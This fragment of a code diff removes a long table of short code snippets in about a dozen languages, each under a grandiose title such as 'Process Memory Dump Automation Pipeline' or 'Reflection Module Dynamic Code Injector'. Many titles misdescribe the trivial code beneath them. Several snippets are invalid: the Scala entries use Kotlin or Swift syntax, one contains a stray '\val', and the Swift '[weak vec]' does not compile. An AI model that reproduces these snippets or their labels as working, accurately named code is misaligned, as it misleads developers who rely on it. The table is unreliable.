-                { name: "3. SecureString Cryptographic Handling Pipeline", code: "$sec = ConvertTo-SecureString 'GPU_X_Key' -AsPlainText -Force" },
-                { name: "4. WMI/CIM Cluster Infrastructure Collector", code: "Get-CimInstance -ClassName Win32_OperatingSystem" },
-                { name: "5. Event Log Structural Auditing Monitor", code: "Get-WinEvent -LogName Security -MaxEvents 5" },
-                { name: "6. Custom PSObject Data Normalization Array", code: "[PSCustomObject]@{ID=1; Target='Core'}" },
-                { name: "7. REST API Asynchronous WebRequester", code: "Invoke-RestMethod -Uri 'https://api.example.com' -Method Get" },
-                { name: "8. Dynamic ScriptBlock Execution Engine", code: "$sb = [scriptblock]::Create('Write-Output \"GPU-X\"'); &$sb" },
-                { name: "9. Active Directory Attribute Bulk Mutator", code: "# Set-ADUser -Identity 'user' -Replace @{title='Architect'}" },
-                { name: "10. Process Memory Dump Automation Pipeline", code: "[System.Diagnostics.Process]::GetProcesses()" },
-                { name: "11. File System Inotify Watcher Monitor", code: "$watcher = New-Object System.IO.FileSystemWatcher" },
-                { name: "12. Registry Hive Structural Integrity Auditor", code: "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion'" },
-                { name: "13. Background Job Asynchronous Task Tracker", code: "Start-Job -ScriptBlock { Start-Sleep -Seconds 1 }" },
-                { name: "14. Cryptographic Hash File Stream Validator", code: "Get-FileHash -Path 'C:\\Windows\\notepad.exe' -Algorithm SHA256" },
-                { name: "15. Network Socket Connection State Scanner", code: "Get-NetTCPConnection -State Listen" },
-                { name: "16. TLS Protocol Force Alignment", code: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" },
-                { name: "17. Error Pipeline Silent Continue Trap", code: "$ErrorActionPreference = 'SilentlyContinue'" },
-                { name: "18. Custom Module Dynamic Export", code: "Export-ModuleMember -Function 'Get-*'" },
-                { name: "19. Environment Binary Path Discovery", code: "[Environment]::GetEnvironmentVariable('Path')" },
-                { name: "20. Raw Gzip Compression Pipeline Matrix", code: "[System.IO.Compression.GzipStream]" }
-            ],
-            bash: [
-                { name: "1. Dynamic Parallel Process Forker Pool", code: "for i in {1..10}; do (echo \"Process $i\"; sleep 1) & done; wait" },
-                { name: "2. Safe Trap System Signals Interceptor", code: "trap 'echo \"Rilevato interrupt!\"; exit 1' SIGINT SIGTERM" },
-                { name: "3. Robust File Descriptor Stream Redirector", code: "exec 3>&1; exec 1>out.log; echo \"Log\"; exec 1>&3" },
-                { name: "4. Array-based Network Host State Auditor", code: "hosts=(\"8.8.8.8\" \"1.1.1.1\"); for h in \"${hosts[@]}\"; do ping -c 1 \"$h\"; done" },
-                { name: "5. IPC Named Pipes FIFO Communications", code: "mkfifo mypipe; echo \"dati\" > mypipe & read line < mypipe; rm mypipe" },
-                { name: "6. Automated Lockfile Race-Condition Preventer", code: "if [ -f lock.pid ]; then exit 1; fi; echo $$ > lock.pid; trap 'rm lock.pid' EXIT" },
-                { name: "7. Advanced Regex Text Dissector (Sed/Awk)", code: "awk '{print $1}' /var/log/syslog | sed 's/\\(.*\\)/IP: \\1/'" },
-                { name: "8. System Resource Usage Threshold Guard", code: "df -h | awk '$5 > 90 {print \"Spazio esaurito!\"}'" },
-                { name: "9. Tar Incremental Binary Backup Generator", code: "tar --incremental -cvf backup.tar /var/www/html" },
-                { name: "10. Environment Configuration Variables Validator", code: ": \"${API_KEY:?Errore: Variabile API_KEY obbligatoria non configurata}\"" },
-                { name: "11. Password Generation Entropy Calculator", code: "head -c 32 /dev/urandom | base64" },
-                { name: "12. Multi-Option CLI Argument Parser (Getopts)", code: "while getopts \"a:b:\" opt; do case $opt in a) echo \"$OPTARG\";; esac; done" },
-                { name: "13. Sudo Execution Context Integrity Checker", code: "if [ \"$EUID\" -ne 0 ]; then echo \"Richiesto Root\"; exit 1; fi" },
-                { name: "14. Network Socket Dev TCP Stream Probe", code: "exec 3<>/dev/tcp/google.com/80; echo -e \"GET / HTTP/1.1\\r\\n\\r\\n\" >&3; head -n 1 <&3" },
-                { name: "15. Automated Database Dump Rotate Scheduler", code: "find /backup -type f -mtime +7 -name \"*.sql\" -delete" },
-                { name: "16. Text File Line-by-Line While Stream", code: "while IFS= read -r line; do echo \"$line\"; done < input.txt" },
-                { name: "17. Custom Associative Hash Map Array", code: "declare -A matrix; matrix[kernel]=\"GPU-X\"; echo \"${matrix[kernel]}\"" },
-                { name: "18. Subshell Isolation Runtime State", code: "(cd /tmp && touch secure.lock)" },
-                { name: "19. String Substring Extraction Filter", code: "str=\"GPU-X-Engine\"; echo \"${str:6:6}\"" },
-                { name: "20. Inline HERE-Document Array Dispatch", code: "cat << 'EOF'\n--- PIPELINE COMPLETED ---\nEOF" }
-            ],
-            csharp: [
-                { name: "1. Task Parallel Library Dataflow Block", code: "using System.Threading.Tasks.Dataflow;\nvar worker = new ActionBlock<int>(res => Console.WriteLine(res));" },
-                { name: "2. LINQ High-Performance Parallel Queries (PLINQ)", code: "using System.Linq;\nvar r = Enumerable.Range(0, 100).AsParallel().Where(x => x % 2 == 0).ToArray();" },
-                { name: "3. Asynchronous TCP Listener Socket Cluster", code: "using System.Net.Sockets;\nvar l = new TcpListener(System.Net.IPAddress.Any, 8080); l.Start();" },
-                { name: "4. Memory Mapped Files Inter-Process Mirror", code: "using System.IO.MemoryMappedFiles;\nvar mmf = MemoryMappedFile.CreateNew(\"buffer\", 1024);" },
-                { name: "5. Reflection Module Dynamic Code Injector", code: "using System.Reflection;\nvar ass = Assembly.GetExecutingAssembly();" },
-                { name: "6. Cryptographic AesGCM Context Implementation", code: "using System.Security.Cryptography;\nbyte[] k = new byte[32]; var aes = new AesGcm(k);" },
-                { name: "7. Garbage Collection Latency Mode Tuner", code: "using System.Runtime;\nGCSettings.LatencyMode = GCLatencyMode.SustainedLowLatency;" },
-                { name: "8. Span and Memory Optimization Structs", code: "System.Span<byte> buffer = stackalloc byte[128];" },
-                { name: "9. Concurrent Dictionary Multi-thread Registry", code: "using System.Collections.Concurrent;\nvar dict = new ConcurrentDictionary<string, int>();" },
-                { name: "10. Windows Services Architectural Controller", code: "using System.ServiceProcess;" },
-                { name: "11. Expression Trees Dynamic Compiler Engine", code: "using System.Linq.Expressions;\nExpression<System.Func<int, bool>> expr = x => x > 5; var f = expr.Compile();" },
-                { name: "12. Safe Handles Unmanaged Resource Manager", code: "using Microsoft.Win32.SafeHandles;" },
-                { name: "13. Mutex App Single Instance Enforcement", code: "using System.Threading;\nbool isNew; var m = new Mutex(true, \"GPU-X-App\", out isNew);" },
-                { name: "14. Interop P/Invoke Native Win32 Callers", code: "using System.Runtime.InteropServices;\n[DllImport(\"user32.dll\")] static extern int MessageBox(System.IntPtr hWnd, string text, string caption, uint type);" },
-                { name: "15. IAsyncEnumerable Micro-Batch Stream Processor", code: "async System.Collections.Generic.IAsyncEnumerable<int> Stream() { yield return 1; await System.Threading.Tasks.Task.Delay(1); }" },
-                { name: "16. Channels High-Performance Queue", code: "using System.Threading.Channels;\nvar ch = Channel.CreateUnbounded<string>();" },
-                { name: "17. Lazy Initialization Pattern Lock-Free", code: "System.Lazy<int> val = new System.Lazy<int>(() => 42);" },
-                { name: "18. Record Structure Equality Implementations", code: "public record User(int Id, string Token);" },
-                { name: "19. ReadOnlySequence Segment Stream Processing", code: "using System.Buffers;" },
-                { name: "20. ValueTasks Allocation Avoidance Pattern", code: "System.Threading.Tasks.ValueTask<int> GetData() => new(42);" }
-            ],
-            java: [
-                { name: "1. Virtual Threads Executor (Java 21+)", code: "import java.util.concurrent.Executors;\nvar exec = Executors.newVirtualThreadPerTaskExecutor();" },
-                { name: "2. CompletableFuture Non-Blocking Pipeline", code: "import java.util.concurrent.CompletableFuture;\nCompletableFuture.supplyAsync(() -> \"GPU\").thenAccept(System.out::println);" },
-                { name: "3. ForkJoinPool Work-Stealing Grid Engine", code: "import java.util.concurrent.ForkJoinPool;\nForkJoinPool pool = ForkJoinPool.commonPool();" },
-                { name: "4. NIO Selector High-Performance Socket Channel", code: "import java.nio.channels.Selector;\nSelector s = Selector.open();" },
-                { name: "5. Memory ByteBuffer Garbage Collection Bypass", code: "import java.nio.ByteBuffer;\nByteBuffer b = ByteBuffer.allocateDirect(1024);" },
-                { name: "6. Custom ClassLoader Runtime Encrypted Decryptor", code: "class SecureLoader extends ClassLoader { }" },
-                { name: "7. ThreadLocal State Isolation Container", code: "ThreadLocal<String> token = new ThreadLocal<>();" },
-                { name: "8. ReentrantLock Advanced Synchronization Monitor", code: "import java.util.concurrent.locks.ReentrantLock;\nReentrantLock lock = new ReentrantLock();" },
-                { name: "9. Streams API Parallel Reduction Processors", code: "import java.util.List;\nList.of(1,2,3).parallelStream().forEach(System.out::println);" },
-                { name: "10. Phase Synchronizer Concurrency Coordinator", code: "import java.util.concurrent.Phaser;\nPhaser phaser = new Phaser(1);" },
-                { name: "11. MethodHandles Low-Overhead Dynamic Invoker", code: "import java.lang.invoke.MethodHandles;" },
-                { name: "12. StampedLock Optimistic Read Memory Guard", code: "import java.util.concurrent.locks.StampedLock;\nStampedLock sl = new StampedLock();" },
-                { name: "13. VarHandles Atomic Memory Order Controls", code: "import java.lang.invoke.VarHandle;" },
-                { name: "14. ProcessBuilder OS Shell Sandbox Isolation", code: "Process p = new ProcessBuilder(\"echo\", \"GPU-X\").start();" },
-                { name: "15. JNI Native Library Bridge Connector", code: "class Native { static { System.loadLibrary(\"bridge\"); } }" },
-                { name: "16. Semaphore Rate Limiter Guard", code: "import java.util.concurrent.Semaphore;\nSemaphore sem = new Semaphore(10);" },
-                { name: "17. WeakReference Memory Cache Map", code: "import java.util.WeakHashMap;\nWeakHashMap<String, Object> map = new WeakHashMap<>();" },
-                { name: "18. Cryptographically Secure Engine KeyPair", code: "import java.security.KeyPairGenerator;\nvar gen = KeyPairGenerator.getInstance(\"RSA\");" },
-                { name: "19. CyclicBarrier Step Sync Boundary", code: "import java.util.concurrent.CyclicBarrier;\nCyclicBarrier b = new CyclicBarrier(3);" },
-                { name: "20. AtomicReference Field Updater System", code: "import java.util.concurrent.atomic.AtomicReferenceFieldUpdater;" }
-            ],
-            ruby: [
-                { name: "1. Ractor Multi-Core CPU Parallel Matrix", code: "r = Ractor.new { 'Ractor parallelo attivo' }; puts r.take" },
-                { name: "2. Fiber Asynchronous Light-Weight Schedulers", code: "f = Fiber.new { Fiber.yield 'GPU' }; puts f.resume" },
-                { name: "3. Custom Metaprogramming MethodMissing Interceptor", code: "class Hook; def method_missing(m, *args); \"Metodo #{m} intercettato\"; end; end" },
-                { name: "4. Socket TCPServer Multi-Client Thread Handler", code: "require 'socket'; s = TCPServer.new 2000; Thread.start(s.accept) { |c| c.puts \"Hello\" }" },
-                { name: "5. EventMachine Reactor Core Emulation Loop", code: "def run_loop; loop { select([],[],[], 0.1) }; end" },
-                { name: "6. Dynamic Module Inclusion Extension Blocks", code: "module Mod; def test; 'OK'; end; end; class Core; include Mod; end" },
-                { name: "7. Mutex Resource Synchronization Lock Box", code: "require 'thread'; m = Mutex.new; m.synchronize { }" },
-                { name: "8. Cryptographic OpenSSL Cipher Stream Factory", code: "require 'openssl'; c = OpenSSL::Cipher.new('AES-256-CBC')" },
-                { name: "9. ThreadPool Worker Queue Task Distributor", code: "q = Queue.new; ts = 3.times.map { Thread.new { while job = q.pop; end } }" },
-                { name: "10. Proc and Lambda Closure Isolation Contexts", code: "f = ->(x) { x * 2 }; puts f.call(5)" },
-                { name: "11. File System Inotify Native Monitor Trapper", code: "File.open('a.lock', 'w') { |f| f.flock(File::LOCK_EX) }" },
-                { name: "12. ObjectSpace Memory Footprint Profiler Engine", code: "require 'objspace'; ObjectSpace.memsize_of('GPU-X')" },
-                { name: "13. Garbage Collection Tuning Profiling Metrics", code: "GC.stat(:count)" },
-                { name: "14. Dynamic Code Evaluation Evaluator Sandbox", code: "eval(\"puts 'GPU-X'\")" },
-                { name: "15. Advanced Signal Handler Graceful Terminator", code: "Signal.trap('INT') { puts 'Chiusura'; exit }" },
-                { name: "16. Class Macro DSL Builder Node", code: "class Core; def self.attr_custom(name); define_method(name) { instance_variable_get(\"@#{name}\") }; end; end" },
-                { name: "17. Open3 Command Execution Pipeling", code: "require 'open3'; stdout, status = Open3.capture2('echo', 'GPU-X')" },
-                { name: "18. Secure Random Hex Generator", code: "require 'securerandom'; token = SecureRandom.hex(16)" },
-                { name: "19. Custom Enumerable Iteration Interface", code: "class Col; include Enumerable; def each; yield 1; end; end" },
-                { name: "20. Singleton Design Structural Allocation", code: "require 'singleton'; class Kernel; include Singleton; end" }
-            ],
-            php: [
-                { name: "1. Swoole Asynchronous Server Routine", code: "/* Richiede estensione Swoole */\n$http = new Swoole\\Http\\Server('127.0.0.1', 9501);\n$http->on('start', function() {});" },
-                { name: "2. PDO Prepared Statements SQL Injection Filter", code: "$db = new PDO('sqlite::memory:'); $stmt = $db->prepare('SELECT * FROM users WHERE id = :id'); $stmt->execute(['id' => 1]);" },
-                { name: "3. FastCGI Process Manager Integration Check", code: "if (function_exists('fastcgi_finish_request')) { fastcgi_finish_request(); }" },
-                { name: "4. Custom Exception Handler Boundary", code: "set_exception_handler(function($e) { echo json_encode(['error' => $e->getMessage()]); });" },
-                { name: "5. Generators Memory Optimizing Stream", code: "function readLines($file) { $h = fopen($file, 'r'); while(($l = fgets($h)) !== false) { yield trim($l); } fclose($h); }" },
-                { name: "6. Cryptographic Openssl Random Pseudo Bytes", code: "$bytes = openssl_random_pseudo_bytes(32); $token = bin2hex($bytes);" },
-                { name: "7. Filter Var Input Data Sanitization", code: "$clean = filter_var($_GET['url'], FILTER_SANITIZE_URL);" },
-                { name: "8. Header Content Security Policy Setter", code: "header(\"Content-Security-Policy: default-src 'self'\");" },
-                { name: "9. PHP8 Attributes Metadata Architecture", code: "#[Attribute] class Route { public function __construct(public string $path) {} }" },
-                { name: "10. Parallel Extension Task Runtime", code: "/* Richiede estensione parallel */\n$runtime = new \\parallel\\Runtime; $runtime->run(function(){ });" },
-                { name: "11. Reflection Method Property Inspector", code: "$ref = new ReflectionClass('PDO'); $methods = $ref->getMethods();" },
-                { name: "12. Memory Limit Allocation Overrider", code: "ini_set('memory_limit', '512M');" },
-                { name: "13. Output Buffering Ob Compression Engine", code: "ob_start('ob_gzhandler'); echo 'GPU-X Data Stream';" },
-                { name: "14. WeakMap Cache Registry Garbage Collector", code: "$cache = new WeakMap(); $obj = new stdClass(); $cache[$obj] = 'Metadata';" },
-                { name: "15. Secure Password Hash Validation API", code: "$h = password_hash('pwd', PASSWORD_ARGON2ID); $v = password_verify('pwd', $h);" },
-                { name: "16. SPL FixedArray Memory Allocation", code: "$arr = new SplFixedArray(10000); $arr[0] = 'data';" },
-                { name: "17. Anonymous Classes Worker Factory", code: "$worker = new class { public function execute() { return 'Task'; } };" },
-                { name: "18. Stream Context Create Timeout Set", code: "$ctx = stream_context_create(['http' => ['timeout' => 5.0]]);" },
-                { name: "19. String Match Expressions Engine (PHP 8)", code: "$res = match($cmd) { 'quit' => 'exit', default => 'run' };" },
-                { name: "20. Json Throw On Error Safe Decoder", code: "$res = json_decode('{}', true, 512, JSON_THROW_ON_ERROR);" }
-            ],
-            typescript: [
-                { name: "1. Strict Conditional Type Mappings", code: "type IsString<T> = T extends string ? true : false;\ntype Test = IsString<number>;" },
-                { name: "2. Advanced Generic Constraint Interfaces", code: "interface Container<T extends { id: string }> { item: T; }" },
-                { name: "3. Readonly Utility Freeze Type Modifiers", code: "interface Immutable { readonly token: string; }\nconst config: Immutable = { token: 'GPU-X' };" },
-                { name: "4. Class Method Decorator Interceptors", code: "function log(target: any, key: string) { console.log(key); }\nclass Engine { @log run() {} }" },
-                { name: "5. Partial Record Key Utility Transpiler", code: "type OptionalMatrix = Partial<Record<'x' | 'y', number>>;" },
-                { name: "6. Type Guard Narrowing Assertion Blocks", code: "function isNode(x: any): x is { val: number } { return 'val' in x; }" },
-                { name: "7. NonNullable Type Exclusions Processor", code: "type SafeData = NonNullable<string | null | undefined>;" },
-                { name: "8. Utility Pick/Omit Structural Mappers", code: "interface User { id: number; name: string; }\ntype PublicProfile = Omit<User, 'id'>;" },
-                { name: "9. Module Namespace Code Partition Isolation", code: "namespace CyberKernel { export class Console {} }" },
-                { name: "10. Async Promise Resolvers Intersection Types", code: "type Response = { ok: true } & { payload: string };" },
-                { name: "11. Infer Keyword Extractor Operators", code: "type ReturnType<T> = T extends (...args: any[]) => infer R ? R : any;" },
-                { name: "12. Tuple Destructuring Variadic Tuple Types", code: "type Elements = [string, ...number[]];" },
-                { name: "13. Abstract Factory Template Architectural Nodes", code: "abstract class Kernel { abstract boot(): void; }" },
-                { name: "14. Type Utility Parameters Array Finder", code: "type Args = Parameters<(x: number, y: string) => void>;" },
-                { name: "15. Template Literal Dynamic String Types", code: "type Event = `on${'Click' | 'Hover'}`;" },
-                { name: "16. Unknown Type Secure Allocation Interface", code: "let input: unknown; if(typeof input === 'string') { let len = input.length; }" },
-                { name: "17. Interface Multi-Inheritance Expansion", code: "interface A { x: number } interface B extends A { y: string }" },
-                { name: "18. Mapped Types Key Remapping Operators", code: "type Getters<T> = { [P in keyof T as `get${Capitalize<string & P>}`]: () => T[P] };" },
-                { name: "19. As Const Literal Inferences Freezing", code: "const Mode = { SECURE: 'secure', RAW: 'raw' } as const;" },
-                { name: "20. Global Declaration Extender Namespace", code: "declare global { interface Window { GPU_X_CORE: string; } }" }
-            ],
-            kotlin: [
-                { name: "1. Coroutines Asynchronous Dispatchers Pool", code: "import kotlinx.coroutines.*\nfun main() = runBlocking { launch(Dispatchers.Default) { } }" },
-                { name: "2. Thread-Safe StateFlow Event Broadcaster", code: "import kotlinx.coroutines.flow.MutableStateFlow\nval state = MutableStateFlow(\"INITIAL\")" },
-                { name: "3. Kotlin Extension Function Inline Wrapper", code: "fun String.clean() = this.replace(Regex(\"[^A-Za-z0-9]\"), \"\")" },
-                { name: "4. Lazy Property Evaluator Synchronization", code: "val lazyToken: String by lazy(LazyThreadSafetyMode.SYNCHRONIZED) { \"TOKEN\" }" },
-                { name: "5. Sealed Class Smart Cast Multi-Routers", code: "sealed class Signal { class Alpha : Signal(); class Beta : Signal() }" },
-                { name: "6. Inline Classes Value Architecture Optimization", code: "@JvmInline value class Password(val raw: String)" },
-                { name: "7. Reified Type Parameters Runtime Query", code: "inline fun <reified T> checkType(item: Any) = item is T" },
-                { name: "8. Sequences Memory Efficient Large Iterations", code: "val seq = generateSequence(1) { x -> x + 1 }.take(1000)" },
-                { name: "9. Channels Actor Pattern Message Box", code: "import kotlinx.coroutines.channels.Channel\nval channel = Channel<Int>()" },
-                { name: "10. Scope Functions Scrambler Utilities Matrix", code: "val x = StringBuilder().apply { append(\"GPU\") }.run { toString() }" },
-                { name: "11. Companion Object Thread-Safe Singleton Nodes", code: "class Core { companion object { val instance = Core() } }" },
-                { name: "12. Data Classes Decomposition Properties", code: "data class Node(val id: Int, val payload: String)" },
-                { name: "13. Custom Null-Safety Elvis Assertions Router", code: "fun check(s: String?): String = s ?: throw IllegalArgumentException()" },
-                { name: "14. Delegates Observable Property Modification Trace", code: "import kotlin.properties.Delegates\nvar track by Delegates.observable(0) { _, old, new -> println(new) }" },
-                { name: "15. Interoperability JvmField Memory Binding", code: "@JvmField val kernelCode = \"GPU-X\"" },
-                { name: "16. Mutex Locking Coroutine Framework Guard", code: "import kotlinx.coroutines.sync.Mutex\nval mu = Mutex()" },
-                { name: "17. Tailrec Recursion Compiler Loop Transformer", code: "tailrec fun findFactorial(n: Int, acc: Int = 1): Int = if(n==1) acc else findFactorial(n-1, acc*n)" },
-                { name: "18. High-Order Functions Inline Performance Blocks", code: "inline fun execute(block: () -> Unit) { block() }" },
-                { name: "19. Contract Compiler Analyzer Constraint Definition", code: "import kotlin.contracts.*\nfun checkValid(s: String?) { contract { returns() implies (s != null) }; if(s==null) throw Exception() }" },
-                { name: "20. Async Deferred Await Concurrency Resolver", code: "fun main() = runBlocking { val d = async { \"GPU\" }; d.await() }" }
-            ],
-            swift: [
-                { name: "1. Actor Model Data Race Isolation Engine", code: "actor SafeKernel { private var state = \"\"; func update(s: String) { state = s } }" },
-                { name: "2. Async/Await Task Group Multi-workers Pool", code: "func load() async { await withTaskGroup(of: Int.self) { g in g.addTask { 1 } } }" },
-                { name: "3. Generic Dynamic Custom Codable JSON Parser", code: "struct DataNode: Codable { let id: Int }" },
-                { name: "4. Property Wrapper Local Storage Shield", code: "@propertyWrapper struct Secure { var wrappedValue: String }" },
-                { name: "5. Closures Escaping Context Memory Retain Guard", code: "func run(comp: @escaping () -> Void) { DispatchQueue.global().async { comp() } }" },
-                { name: "6. Protocol Oriented Polymorphic Structural Mixin", code: "protocol Runnable { func start() } extension Runnable { func start() {} }" },
-                { name: "7. Result Enumeration Success Failure Containers", code: "enum NetworkError: Error { case bad }; let r: Result<Int, NetworkError> = .success(1)" },
-                { name: "8. Memory Retain Cycles Unowned Reference Pointers", code: "class Node { unowned var parent: Node? }" },
-                { name: "9. Opaque Return Types Compiler Constraint Interface", code: "func getShape() -> some Equatable { return 5 }" },
-                { name: "10. Core Dispatch QoS Queue Multi-Threading Pipeline", code: "DispatchQueue.global(qos: .background).async { }" },
-                { name: "11. Deinit Resource Release Automated Allocation Tracker", code: "class Box { deinit { print(\"Released\") } }" },
-                { name: "12. Guard Pattern Early Return Expressions Stack", code: "func check(s: String?) { guard let res = s else { return }; print(res) }" },
-                { name: "13. Enum Pattern Matching Associated Value Parsers", code: "enum State { case active(Int); case dead }" },
-                { name: "14. Lazy Sequences Memory Footprint Multi-Mappers", code: "let lazyArr = [1,2,3].lazy.map { $0 * 2 }" },
-                { name: "15. Dynamic Member Lookup Bridge Synthesizer", code: "@dynamicMemberLookup struct Matrix { subscript(dynamicMember member: String) -> String { \"\" } }" },
-                { name: "16. Inout Reference Address Memory Exchanger", code: "func swap(a: inout Int, b: inout Int) { let t = a; a = b; b = t; }" },
-                { name: "17. Generics Where Clause Structural Interceptors", code: "func match<T: Collection>(items: T) where T.Element: Equatable { }" },
-                { name: "18. KeyPath Composition Property Direct Access", code: "struct User { let id: Int }; let path = \\User.id" },
-                { name: "19. OSLog Unified Diagnostic Telemetry System", code: "import OSLog\nlet log = Logger(subsystem: \"GPU\", category: \"Core\")" },
-                { name: "20. Automatic Reference Counting Weak Array Buffer", code: "var buffers: [weak vec] = [] // Struttura ad allocazione controllata" }
-            ],
-            scala: [
-                { name: "1. Implicits Parameter Dependency Injection Pattern", code: "implicit val timeout: Int = 5000\nfunc run(implicit t: Int) { println(t) }" },
-                { name: "2. Akka Actors System Concurrent Message Handler", code: "/* Richiede Akka System Framework compilation context */" },
-                { name: "3. Monadic Options Map Flatten Functional Flow", code: "val opt: Option[Int] = Some(5); val res = opt.map(_ * 2)" },
-                { name: "4. Tailrec Functional Fibonacci Vector Calculators", code: "@annotation.tailrec fun loop(n: Int, acc: Int): Int = if(n<=0) acc else loop(n-1, acc*n)" },
-                { name: "5. Case Classes Pattern Matching Structures Tree", code: "case class Message(id: String); val m = Message(\"GPU\")" },
-                { name: "6. Futures Execution Context Parallel Composers", code: "import scala.concurrent.Future\nimport scala.concurrent.ExecutionContext.Implicits.global" },
-                { name: "7. Lazy Vals Lazy Evaluation State Memory Synchronizer", code: "lazy val expensiveData = { Thread.sleep(100); 42 }" },
-                { name: "8. Partial Functions Input Ranges Validation Shield", code: "val pf: PartialFunction[Int, String] = { case x if x > 0 => \"Positivo\" }" },
-                { name: "9. Traits Mixin Multi-Inheritance Architectural Nodes", code: "trait Logger { def log() {} } class Kernel extends Logger" },
-                { name: "10. Covariant Invariant Contravariant Generic Structs", code: "class Container[+A](val item: A)" },
-                { name: "11. Abstract Types High-Kinded Types Core Compiler", code: "trait Collection { type Element; val data: List[Element] }" },
-                { name: "12. Either Left Right Monadic Error Propagation Tree", code: "val res: Either[String, Int] = Right(42)" },
-                { name: "13. Structural Value Classes Heap Allocation Defeater", code: "class Wrapper(val raw: Int) extends AnyVal" },
-                { name: "14. Currying Multi-Parameter Lists Context Combiner", code: "func add(x: Int)(y: Int): Int = x + y" },
-                { name: "15. Streams Lazy List Sequences Processing Engine", code: "val stream = LazyList.from(1).take(100)" },
-                { name: "16. Try Catch Success Failure Functional Wrappers", code: "import scala.util.Try\val eval = Try(\"123\".toInt)" },
-                { name: "17. Context Bounds Type Classes Pattern Implementer", code: "func sort[A : Ordering](list: List[A]) { }" },
-                { name: "18. String Interpolator Custom Formatting Framework", code: "val v = \"GPU\"; s\"Engine: $v\"" },
-                { name: "19. Parallel Collections Multi-threading Array Processor", code: "/* parallel data optimization blocks */" },
-                { name: "20. Companion Objects Apply Factory Static Allocator", code: "object Target { def apply() = new Target }; class Target" }
-            ],
-            haskell: [
-                { name: "1. Lazy Evaluation Infinite Fibonacci Stream Generator", code: "fibs = 0 : 1 : zipWith (+) fibs (tail fibs)\nmain = print (take 10 fibs)" },
-                { name: "2. Monadic I/O State Flow Bind Pipeline Operators", code: "main = putStrLn \"GPU\" >>= \\_ -> putStrLn \"X\"" },
-                { name: "3. Custom Algebraic Data Types Pattern Matching Guard", code: "data Signal = Clear | Warn Int\ncheck Clear = 0\ncheck (Warn x) = x" },
-                { name: "4. Currying Partial Function Applications Multipliers", code: "multThree :: Int -> Int -> Int -> Int; multThree x y z = x * y * z" },
-                { name: "5. Maybe Monad Safely Nested Missing Values Resolvers", code: "extract :: Maybe Int -> Maybe Int; extract m = m >>= (\\x -> return (x + 1))" },
-                { name: "6. Type Classes Polymorphic Structures System Definitions", code: "class Eval a where eval :: a -> String" },
-                { name: "7. Functor Applicative Monad Progression Tree Transformers", code: "res = fmap (*2) [1,2,3]" },
-                { name: "8. Higher Order Functions Lambda Map Fold Evaluators", code: "calc = foldl (+) 0 (map (*2) [1..100])" },
-                { name: "9. Concurrency MVars Shared Thread States Mutex Check", code: "import Control.Concurrent\nrun = newMVar (10 :: Int)" },
-                { name: "10. Strict Evaluation DeepSeq Performance Memory Forces", code: "import Control.DeepSeq\nforceEval x = x `deepseq` x" },
-                { name: "11. List Comprehensions Mathematical Set Calculators", code: "grid = [(x,y) | x <- [1..5], y <- [1..5], x /= y]" },
-                { name: "12. Monad Transformers StateT OptionT Integrators", code: "import Control.Monad.State" },
-                { name: "13. GADTs Generalized Algebraic Data Types Matrices", code: "data Expr a where Lit :: Int -> Expr Int" },
-                { name: "14. Software Transactional Memory STM Atomicity Blocks", code: "import Control.Concurrent.STM" },
-                { name: "15. Guarded Expressions Conditional Branching Pipelines", code: "test x | x > 0 = 1 | otherwise = 0" },
-                { name: "16. Records Syntactic Sugar Structures Named Fields", code: "data Host = Host { ip :: String, port :: Int }" },
-                { name: "17. Newtype Heap Overhead Removal Type Safeties", code: "newtype Key = Key String" },
-                { name: "18. QuickCheck Automated Invariant Property Testing", code: "prop_RevRev xs = reverse (reverse xs) == (xs :: [Int])" },
-                { name: "19. Data Parallelism Control Parallel Strategies", code: "import Control.Parallel.Strategies" },
-                { name: "20. Foreign Function Interface C Intrinsic Binding Interops", code: "foreign import ccall \"math.h sin\" c_sin :: Double -> Double" }
-            ],
-            lua: [
-                { name: "1. Metatables Operator Overloading Hook Arrays", code: "local mt = { __add = function(a, b) return a.val + b.val end }\nlocal x, y = {val=10}, {val=20}; setmetatable(x, mt)" },
-                { name: "2. Coroutines Cooperative Light Multitasking Thread", code: "local co = coroutine.create(function() coroutine.yield('GPU') end)\nprint(coroutine.resume(co))" },
-                { name: "3. Closures Private Lexical Scopes Memory Variable Encaps", code: "function counter() local c = 0 return function() c = c + 1 return c end end" },
-                { name: "4. Dynamic Environment Env Tables Sandboxing Engine", code: "local env = { print = print }; setfenv(1, env)" },
-                { name: "5. Pcall Error Boundary Safe Runtime Trapper", code: "local ok, err = pcall(function() error('crash') end)" },
-                { name: "6. Custom Object Oriented Prototypes Inheritance Core", code: "Class = {}; Class.__index = Class; function Class:new() return setmetatable({}, self) end" },
-                { name: "7. Variadic Functions Arguments Packaging Vectors", code: "function sum(...) local s = 0 for _, v in ipairs({...}) do s = s + v end return s end" },
-                { name: "8. Garbage Collection Auto Threshold Tuning Monitor", code: "collectgarbage('setpause', 100); collectgarbage('setstepmul', 200)" },
-                { name: "9. String Pattern Matching Capture Regex Evaluator", code: "local matches = string.gmatch('target=8080', '(%w+)=(%d+)')" },
-                { name: "10. LuaJIT FFI Hardware Direct Memory Bindings", code: "local ffi = require('ffi'); ffi.cdef[[int printf(const char *fmt, ...);]]" },
-                { name: "11. Weak Tables Memory Cache Reference Invalidator", code: "local cache = {}; setmetatable(cache, { __mode = 'k' })" },
-                { name: "12. Rawset Bypass Metatable Mutation Triggers", code: "local t = {}; rawset(t, 'key', 'value')" },
-                { name: "13. IO Stream Processing Binary File Iterator", code: "local f = io.open('b.bin', 'rb'); local chunk = f:read(1024); f:close()" },
-                { name: "14. Table Pack Unpack State Manipulator Node", code: "local packed = table.pack(1, 2, 3); local a, b = table.unpack(packed)" },
-                { name: "15. Global Manifest Variable Lock Preventer System", code: "setmetatable(_G, { __newindex = function(_, n) error('Global locked') end })" },
-                { name: "16. Custom Path Loader Assembly Injectors", code: "package.path = package.path .. ';/secure/?.lua'" },
-                { name: "17. Tail Call Optimizations Recursion Limit By-pass", code: "function loop(n) if n <= 0 then return 'end' end return loop(n-1) end" },
-                { name: "18. String In-place Buffer Concatenation Fast Speed", code: "local t = {}; for i=1,100 do table.insert(t, 'X') end local res = table.concat(t)" },
-                { name: "19. Module Architecture Strict Return Scope Export", code: "local M = {}; function M.run() end; return M" },
-                { name: "20. Bitwise Logical Operations Registers Simulation", code: "local bit = require('bit'); local res = bit.bor(0x01, 0x02)" }
-            ]
+        const SCRIPTS_TEMPLATES = {
